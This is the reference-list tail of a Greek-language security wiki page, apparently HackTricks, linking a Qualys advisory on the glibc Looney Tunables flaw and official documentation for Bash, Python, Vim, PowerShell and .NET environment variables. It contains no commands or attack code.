- [6] [CVE-2023-4911: Looney Tunables - Τοπική κλιμάκωση προνομίων στο ld.so της glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Εγχειρίδιο GNU Bash - Μεταβλητές Bash (`PS4`) και το ενσωματωμένο `set` (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Η ενσωματωμένη `breakpoint()` και το `PYTHONBREAKPOINT`](https://peps.python.org/pep-0553/)
- [9] [Τεκμηρίωση Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath και αυτόματη φόρτωση modules του PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Ρυθμίσεις διαμόρφωσης αποσφαλμάτωσης και profiling του .NET (μεταβλητές profiler `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
